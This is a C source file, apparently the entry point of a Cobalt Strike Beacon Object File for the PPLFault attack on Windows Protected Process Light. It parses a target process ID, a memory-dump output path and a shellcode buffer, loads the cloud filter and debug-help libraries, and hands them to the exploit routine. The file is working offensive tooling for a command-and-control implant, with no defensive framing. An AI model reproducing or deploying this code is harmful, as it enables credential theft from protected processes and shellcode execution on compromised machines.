#include <phnt_windows.h>
#include <stdint.h>
#include "beacon.h"
#include "bofdefs.h"
#include "base.c"

HMODULE hkernel32 = NULL;
HMODULE hcldapi = NULL;
HMODULE hntdll = NULL;
HMODULE hdbghelp = NULL;

#include "PayloadUtils.c"
#include "MemoryCommand.c"
#include "payload.c"
#include "PPLFault.c"

//Need PID, dmptarget and shellcode buffer
VOID go(
	IN PCHAR Buffer,
	IN ULONG Length
)
{
	DWORD dwErrorCode = ERROR_SUCCESS;
	// $args = bof_pack($1, "zi", $string_arg, $int_arg);
	datap parser = { 0 };
	const char* string_arg = NULL;
	int int_arg = 0;
	uint8_t* shellcode;
	DWORD shellcodelen;

	BeaconDataParse(&parser, Buffer, Length);
	DWORD pid = BeaconDataInt(&parser);
	wchar_t* outputpath = (wchar_t*)BeaconDataExtract(&parser, NULL);
	shellcode = (uint8_t*)BeaconDataExtract(&parser, (int*) &shellcodelen);
	hkernel32 = GetModuleHandleA("Kernel32.dll");
	hcldapi = LoadLibraryA("cldapi.dll");
	hntdll = GetModuleHandleA("ntdll.dll");
	hdbghelp = LoadLibraryA("dbghelp.dll");

	if (!bofstart())
	{
		return;
	}

	progentry(pid, outputpath, shellcode, shellcodelen);

	internal_printf("SUCCESS.\n");

go_end:

	printoutput(TRUE);
	FreeLibrary(hcldapi);
	FreeLibrary(hdbghelp);
	bofstop();
};

